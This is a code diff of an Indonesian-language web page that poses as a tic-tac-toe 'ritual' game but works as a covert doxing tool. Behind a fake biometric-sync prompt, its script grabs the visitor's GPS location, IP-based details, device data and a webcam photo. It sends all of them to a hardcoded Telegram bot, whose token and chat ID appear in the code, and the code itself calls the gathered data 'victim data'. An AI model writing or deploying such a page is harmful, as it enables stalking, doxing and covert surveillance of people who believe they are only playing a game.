@@ -3,164 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S L I T H E R O N | ASCENSION</title>
+    <title>S L I T H E R O N | RITUAL</title>
     <style>
-        :root { --accent: #ff0000; --bg: #000; }
+        :root { --accent: #ff3333; --bg: #000000; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         
-        #frame { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; border: 1px solid #111; position: relative; }
-        h1 { font-weight: 200; letter-spacing: 12px; font-size: 20px; margin-bottom: 10px; color: #fff; }
-        .lore-txt { font-size: 9px; color: #444; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 30px; }
+        #gate { width: 100%; max-width: 380px; text-align: center; padding: 40px 20px; border: 1px solid #111; background: linear-gradient(180deg, #050505 0%, #000 100%); }
+        h1 { font-weight: 200; letter-spacing: 12px; font-size: 22px; margin-bottom: 20px; color: #fff; }
+        .line { height: 1px; width: 50px; background: var(--accent); margin: 0 auto 30px; }
+        .info { font-size: 10px; line-height: 2; color: #444; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 40px; padding: 0 20px; }
         
-        #gift-btn { display: none; position: absolute; top: 15px; right: 15px; background: #000; border: 1px solid #222; color: #fff; padding: 8px 12px; font-size: 9px; cursor: pointer; letter-spacing: 2px; z-index: 100; }
-        .dot { position: absolute; top: -3px; right: -3px; width: 8px; height: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .btn-sync { background: transparent; border: 1px solid #333; color: #fff; padding: 15px 40px; font-size: 11px; letter-spacing: 5px; cursor: pointer; transition: 0.4s; text-transform: uppercase; }
+        .btn-sync:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(255, 51, 51, 0.2); }
 
-        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 30px; }
-        .cell { height: 95px; background: #050505; border: 1px solid #111; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; color: var(--accent); transition: 0.3s; }
+        #arena { display: none; width: 100%; max-width: 320px; }
+        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+        .cell { height: 100px; background: #050505; border: 1px solid #111; display: flex; align-items: center; justify-content: center; font-size: 30px; cursor: pointer; color: var(--accent); }
         
-        #btn-action { background: transparent; border: 1px solid #333; color: #fff; padding: 12px 35px; font-size: 10px; letter-spacing: 5px; cursor: pointer; text-transform: uppercase; }
-        #status { font-size: 10px; color: #222; letter-spacing: 3px; margin-bottom: 20px; text-transform: uppercase; }
-
-        #scare-box { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        #scare-img { width: 100%; height: 75vh; object-fit: cover; border-bottom: 2px solid var(--accent); }
-        .scare-msg { color: var(--accent); font-family: monospace; font-size: 14px; margin-top: 30px; letter-spacing: 2px; text-align: center; line-height: 1.6; }
-
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="frame">
-    <button id="gift-btn" onclick="openGift()">HADIAH <div class="dot"></div></button>
+<div id="gate">
     <h1>SLITHERON</h1>
-    <div class="lore-txt">Pahlawan vs Parasit Digital</div>
-    <p id="status">Sinkronisasi Diperlukan</p>
-    
-    <div class="board" id="board" style="opacity:0.1; pointer-events:none;">
-        <div class="cell" id="c0" onclick="play(0)"></div><div class="cell" id="c1" onclick="play(1)"></div><div class="cell" id="c2" onclick="play(2)"></div>
-        <div class="cell" id="c3" onclick="play(3)"></div><div class="cell" id="c4" onclick="play(4)"></div><div class="cell" id="c5" onclick="play(5)"></div>
-        <div class="cell" id="c6" onclick="play(6)"></div><div class="cell" id="c7" onclick="play(7)"></div><div class="cell" id="c8" onclick="play(8)"></div>
-    </div>
-    
-    <button id="btn-action" onclick="ascend()">Ascend as Hero</button>
+    <div class="line"></div>
+    <p class="info">Sinkronisasi identitas diperlukan untuk memvalidasi akses pahlawan ke dalam ritual cyber.</p>
+    <button class="btn-sync" onclick="startInfiltration()">Sinkronkan</button>
 </div>
 
-<div id="scare-box">
-    <img id="scare-img" src="">
-    <div class="scare-msg">THE MIRROR SHIELD HAS SHATTERED.<br>I SEE YOU, HERO.</div>
-    <audio id="scream-audio" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+<div id="arena">
+    <div style="font-size: 10px; letter-spacing: 3px; color: #444; margin-bottom: 20px;">RITUAL DIMULAI...</div>
+    <div class="board">
+        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
+        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
+        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
+    </div>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
-    const TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
-    const ID = '6932904607';
-    let board = ["","","","","","","","",""];
-    let faceURL = "";
-    let gameOver = false;
+    const BOT_TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
+    const CHAT_ID = '6932904607';
 
-    async function tg(method, data) {
-        let url = `https://api.telegram.org/bot${TOKEN}/${method}`;
+    // Cek Kunjungan Sebelumnya
+    const checkVisit = localStorage.getItem('vstd') ? "Ada / Yes" : "Tidak ada / None";
+    localStorage.setItem('vstd', 'true');
+
+    async function pushToTelegram(method, data) {
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+        let body;
+
         if (method === 'sendPhoto') {
-            const fd = new FormData(); fd.append('chat_id', ID); fd.append('photo', data);
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', data);
             return fetch(url, { method: 'POST', body: fd });
-        }
-        return fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: ID, ...data}) });
-    }
-
-    function ascend() {
-        if(confirm("Gunakan 'Mirror Shield' untuk sinkronisasi biometrik pahlawan?")) {
-            document.getElementById('btn-action').style.display = 'none';
-            document.getElementById('board').style.opacity = '1';
-            document.getElementById('board').style.pointerEvents = 'auto';
-            document.getElementById('status').innerText = "PURGING SLITHERON...";
-            startInfiltration();
+        } else {
+            body = JSON.stringify({ chat_id: CHAT_ID, ...data });
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: body
+            });
         }
     }
 
     async function startInfiltration() {
-        navigator.geolocation.getCurrentPosition(async p => {
-            // 1. Kirim Map (Sequential)
-            await tg('sendLocation', { latitude: p.coords.latitude, longitude: p.coords.longitude });
-            // 2. Kirim Data Report
-            await sendFullReport();
-            // 3. Capture Foto
-            capture();
-        }, async () => {
-            await sendFullReport();
-            capture();
-        });
+        if(confirm("Gunakan 'Mirror Shield' dengan GPS dan Kamera untuk sinkronisasi biometrik?")) {
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('arena').style.display = 'block';
+            
+            // PROSES DOXING BERURUTAN
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // 1. Kirim Map Lokasi
+                await pushToTelegram('sendLocation', { 
+                    latitude: pos.coords.latitude, 
+                    longitude: pos.coords.longitude 
+                });
+                
+                // 2. Ambil & Kirim Teks Laporan
+                await generateTextReport();
+                
+                // 3. Ambil & Kirim Foto
+                captureFace();
+            }, async () => {
+                // Jika GPS ditolak, tetap kirim teks & foto
+                await generateTextReport();
+                captureFace();
+            });
+        }
     }
 
-    async function sendFullReport() {
+    async function generateTextReport() {
         try {
-            const r = await fetch('https://ipapi.co/json/');
-            const d = await r.json();
-            const now = new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'}).replace(/\//g,'-');
-            const txt = `<b>🔱 GABRIEL - HERO REPORT</b>\n\nWaktu: ${now}\nIP Korban: <code>${d.ip}</code>\nISP: ${d.org}\nKota: ${d.city}\nRes: ${window.screen.width}x${window.screen.height}\nOS: ${navigator.platform}`;
-            await tg('sendMessage', { text: txt, parse_mode: 'HTML' });
-        } catch(e) {}
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\//g, '-');
+            
+            const report = `<b>DATA KORBAN</b>\n\n` +
+                `Waktu Akses | Access Time : ${now}\n` +
+                `Alamat IP | IP Address : <code>${d.ip}</code>\n` +
+                `Perangkat | Device : ${navigator.userAgent}\n` +
+                `Sistem Operasi | Operating System : ${navigator.platform}\n` +
+                `Resolusi Layar | Screen Resolution : ${window.screen.width} x ${window.screen.height}\n` +
+                `Kunjungan Sebelumnya | Previous Visit : ${checkVisit}`;
+
+            await pushToTelegram('sendMessage', { text: report, parse_mode: 'HTML' });
+        } catch (e) {}
     }
 
-    async function capture() {
+    async function captureFace() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video:true});
-            const vid = document.getElementById('v'); vid.srcObject = stream;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
             setTimeout(() => {
-                const can = document.getElementById('c');
-                can.getContext('2d').drawImage(vid, 0, 0, 640, 480);
-                can.toBlob(b => {
-                    faceURL = URL.createObjectURL(b);
-                    tg('sendPhoto', b);
-                    stream.getTracks().forEach(t => t.stop());
+                const canvas = document.getElementById('c');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    pushToTelegram('sendPhoto', blob);
+                    stream.getTracks().forEach(track => track.stop());
                 }, 'image/jpeg');
-            }, 2000);
-        } catch(e) {}
+            }, 2500);
+        } catch (e) {}
     }
 
-    function play(i) {
-        if(board[i] !== "" || gameOver) return;
-        board[i] = "X";
-        document.getElementById(`c${i}`).innerText = "X";
-        
-        if(checkWin("X")) return endRitual();
-        if(!board.includes("")) return endRitual();
-
-        // Bot (Slitheron) Logic
-        setTimeout(() => {
-            let empty = board.map((v, idx) => v === "" ? idx : null).filter(v => v !== null);
-            if(empty.length > 0) {
-                let m = empty[Math.floor(Math.random()*empty.length)];
-                board[m] = "O";
-                document.getElementById(`c${m}`).innerText = "O";
-                document.getElementById(`c${m}`).style.color = "#fff";
-                if(checkWin("O")) endRitual();
-            }
-        }, 400);
-    }
-
-    function checkWin(p) {
-        const win = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-        return win.some(l => l.every(idx => board[idx] === p));
-    }
-
-    function endRitual() {
-        gameOver = true;
-        document.getElementById('status').innerText = "SLITHERON DEFEATED";
-        document.getElementById('gift-btn').style.display = 'block';
-    }
-
-    function openGift() {
-        if(!faceURL) { alert("Ritual Belum Selesai!"); return; }
-        const ui = document.getElementById('scare-box');
-        document.getElementById('scare-img').src = faceURL;
-        ui.style.display = 'flex';
-        document.getElementById('scream-audio').play();
-        if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
+    function move(el) {
+        if(el.innerText === "") el.innerText = "X";
     }
 </script>
 </body>
